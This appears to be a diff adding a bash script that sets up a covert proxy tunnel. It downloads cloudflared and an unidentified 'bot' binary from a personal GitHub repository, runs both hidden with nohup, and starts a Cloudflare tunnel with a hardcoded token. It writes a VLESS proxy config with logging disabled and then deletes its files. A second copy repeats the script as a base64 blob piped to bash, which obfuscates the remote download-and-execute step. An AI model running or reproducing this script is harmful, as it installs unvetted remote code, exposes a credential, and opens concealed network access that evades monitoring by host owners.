@@ -1,0 +1,65 @@
+#!/bin/bash
+export UUID=${UUID:-'xyz'}
+curl -L https://github.com/cloudflare/cloudflared/releases/download/2024.6.1/cloudflared-linux-arm64 -o cf && chmod +x cf
+curl -L https://github.com/eoovve/test/releases/download/ARM/web -o ./bot && chmod +x ./bot
+sleep 5
+nohup ./cf tunnel --edge-ip-version 4 run --protocol http2 --token eyJhIjoiMjIxMDJlN2YyMjA3MTE1ZDY1ODc3MTMxNGNiMjlhM2EiLCJ0IjoiNzEwMzdiMTYtNDc5My00MGMxLWE2ZjMtOTc2NDI1YTMwOWFjIiwicyI6Ik5qZ3haalJpTWpndE9UTTBNaTAwTWpKakxUZzROMlF0T0dKak16STFaR015TURrMCJ9  >/dev/null 2>&1 &
+sleep 5
+generate_config() {
+  cat > ./bot.json << EOF
+{
+  "log": {
+    "access": "/dev/null",
+    "error": "/dev/null",
+    "loglevel": "none"
+  },
+  "inbounds": [
+    {
+      "port": 25552,
+      "protocol": "vless",
+      "settings": {
+        "clients": [
+          {
+            "id": "$UUID",
+            "level": 0
+          }
+        ],
+        "decryption": "none"
+      },
+      "streamSettings": {
+        "network": "ws",
+        "wsSettings": {
+          "path": "/xyz"
+        }
+      }
+    }
+  ],
+  "dns": {
+    "servers": [
+      "https+local://1.1.1.1/dns-query"
+    ]
+  },
+  "outbounds": [
+    {
+      "protocol": "freedom",
+      "settings": {}
+    }
+  ]
+}
+EOF
+}
+generate_config
+sleep 3
+nohup ./bot -c ./bot.json >/dev/null 2>&1 &
+sleep 2
+echo -e "...ok..."
+sleep 10
+rm ./cf ./bot.json
+tail -f /dev/null
+
+===============================================================================
+
+#!/bin/bash
+
+echo "ZXhwb3J0IFVVSUQ9JHtVVUlEOi0neHl6J30KCmN1cmwgLUwgaHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvZG93bmxvYWQvMjAyNC42LjEvY2xvdWRmbGFyZWQtbGludXgtYXJtNjQgLW8gY2YgJiYgY2htb2QgK3ggY2YKY3VybCAtTCBodHRwczovL2dpdGh1Yi5jb20vZW9vdnZlL3Rlc3QvcmVsZWFzZXMvZG93bmxvYWQvQVJNL3dlYiAtbyAuL2JvdCAmJiBjaG1vZCAreCAuL2JvdAoKc2xlZXAgNQoKbm9odXAgLi9jZiB0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gNCBydW4gLS1wcm90b2NvbCBodHRwMiAtLXRva2VuIGV5SmhJam9pTWpJeE1ESmxOMll5TWpBM01URTFaRFkxT0RjM01UTXhOR05pTWpsaE0yRWlMQ0owSWpvaU56RXdNemRpTVRZdE5EYzVNeTAwTUdNeExXRTJaak10T1RjMk5ESTFZVE13T1dGaklpd2ljeUk2SWs1cVozaGFhbEpwVFdwbmRFOVVUVEJOYVRBd1RXcEtha3hVWnpST01sRjBUMGRLYWsxNlNURmFSMDE1VFVSck1DSjkgID4vZGV2L251bGwgMj4mMSAmCgpzbGVlcCA1CgpnZW5lcmF0ZV9jb25maWcoKSB7CiAgY2F0ID4gLi9ib3QuanNvbiA8PCBFT0YKewogICJsb2ciOiB7CiAgICAiYWNjZXNzIjogIi9kZXYvbnVsbCIsCiAgICAiZXJyb3IiOiAiL2Rldi9udWxsIiwKICAgICJsb2dsZXZlbCI6ICJub25lIgogIH0sCiAgImluYm91bmRzIjogWwogICAgewogICAgICAicG9ydCI6IDI1NTUyLAogICAgICAicHJvdG9jb2wiOiAidmxlc3MiLAogICAgICAic2V0dGluZ3MiOiB7CiAgICAgICAgImNsaWVudHMiOiBbCiAgICAgICAgICB7CiAgICAgICAgICAgICJpZCI6ICIkVVVJRCIsCiAgICAgICAgICAgICJsZXZlbCI6IDAKICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJkZWNyeXB0aW9uIjogIm5vbmUiCiAgICAgIH0sCiAgICAgICJzdHJlYW1TZXR0aW5ncyI6IHsKICAgICAgICAibmV0d29yayI6ICJ3cyIsCiAgICAgICAgIndzU2V0dGluZ3MiOiB7CiAgICAgICAgICAicGF0aCI6ICIveHl6IgogICAgICAgIH0KICAgICAgfQogICAgfQogIF0sCiAgImRucyI6IHsKICAgICJzZXJ2ZXJzIjogWwogICAgICAiaHR0cHMrbG9jYWw6Ly8xLjEuMS4xL2Rucy1xdWVyeSIKICAgIF0KICB9LAogICJvdXRib3VuZHMiOiBbCiAgICB7CiAgICAgICJwcm90b2NvbCI6ICJmcmVlZG9tIiwKICAgICAgInNldHRpbmdzIjoge30KICAgIH0KICBdCn0KRU9GCn0KZ2VuZXJhdGVfY29uZmlnCnNsZWVwIDMKCgpub2h1cCAuL2JvdCAtYyAuL2JvdC5qc29uID4vZGV2L251bGwgMj4mMSAmCgpzbGVlcCAyCgplY2hvIC1lICIuLi5vay4uLiIKc2xlZXAgMTAKCgoKcm0gLi9jZiAuL2JvdC5qc29u" | base64 -d | bash
+tail -f /dev/null
